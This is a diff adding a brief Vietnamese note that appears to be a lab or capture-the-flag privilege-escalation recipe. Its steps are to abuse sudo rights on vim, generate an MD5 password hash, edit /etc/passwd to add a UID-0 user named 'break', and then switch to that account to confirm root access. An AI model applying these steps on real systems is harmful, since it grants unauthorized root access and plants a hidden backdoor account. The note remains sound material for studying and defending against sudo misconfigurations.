@@ -1,0 +1,13 @@
+đầu tiên sudo -l : check được user dùng vim như root
+
+bước 2 là ssl 1 cái password : ssl passwd -1 password_here : ví dụ password = $1$gbxxeWoG$bXTRw/EV.RA.Ztxqy0D0J/ 
+
+bước 3 vim /etc/passwd để add user
+
+ví dụ user là break 
+
+break:$1$gbxxeWoG$bXTRw/EV.RA.Ztxqy0D0J/:0:0:/root:/root:/bin/bash
+
+rồi su break để login break 
+check whoami 
+id
